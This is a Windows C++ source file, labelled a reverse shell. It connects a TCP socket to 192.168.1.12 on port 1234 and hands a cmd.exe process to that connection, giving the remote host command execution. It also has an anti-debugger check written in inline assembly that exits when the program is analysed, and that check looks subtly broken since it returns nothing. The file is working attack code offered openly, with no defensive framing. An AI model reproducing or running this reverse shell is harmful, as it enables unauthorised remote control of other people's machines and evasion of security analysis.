#include <iostream>
#include <winsock2.h>
#include "windows.h"
#include "iostream"


bool presentDebugger( ){
	
	asm(
	"movl $0x30,%ebx"
	"movl %fs:(%ebx), %eax"
	"movl 0x2(%eax),%eax"
	"and $0xff, %eax"
	);
	
}

/*

 REVERSE_SHELL_CPP
*/

using namespace std;
/* run this program using the console pauser or add your own getch, system("pause") or input loop */

int main(int argc, char** argv) {
	
	/*
	 # for fun
	*/
	if( presentDebugger( ) ){
		ExitProcess(0);
	}
	
	STARTUPINFO si={sizeof(si)};
	PROCESS_INFORMATION pi;
	
	SOCKET sock;
	SOCKADDR_IN sin;
	WSADATA wsd;
	
	memset( &pi, 0, sizeof(pi) );
	memset( &wsd, 0, sizeof(wsd) );
	
	WSAStartup( MAKEWORD(2,2), &wsd );
	/*
	 # WSASocketA
	*/
	if( (sock= WSASocketA( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0  )) == INVALID_SOCKET ){
		cout << "[-] cannot create wsaSocket" << endl;
		return 1;
	}
	
	sin.sin_family 		= AF_INET;
	sin.sin_port   		= htons(1234);
	sin.sin_addr.s_addr = inet_addr("192.168.1.12");
	printf("[+] Socket created\r\n" );
	printf("[+] connect on 0x%08x \r\n", sin.sin_addr.s_addr );
	printf("[+] listen on  %i \r\n", sin.sin_port );
	
	if( WSAConnect( sock, (SOCKADDR*)&sin, sizeof(sin), NULL, NULL, (unsigned int)NULL, (unsigned int)NULL ) == SOCKET_ERROR ){
		printf("[-] Connection failed");
		WSACleanup();
		return 1;
	}
	
	memset( &si, 0, sizeof(si) );
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	si.cb = sizeof(si);
	si.hStdInput = si.hStdOutput = si.hStdError =  (HANDLE)sock;
	/*
	 # Create Process
	*/
	if( !CreateProcess( 
		NULL,
		(LPSTR)"cmd.exe",
		NULL,
		NULL,
		true,
		0,
		NULL,
		NULL,
		&si, &pi 
	) ){
		cout << "[- ] cannot create cmd process" << endl;
		WSACleanup( );
	}
	
	printf("[+] Handle process - 0x%08x <%i>\r\n", pi.hProcess, pi.hProcess );	
	printf("[+] process - 0x%08x <%i>\r\n", pi.dwProcessId, pi.dwProcessId );
	
	WaitForSingleObject( pi.hProcess, INFINITE );
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
	
	system("pause");
	return 0;
}
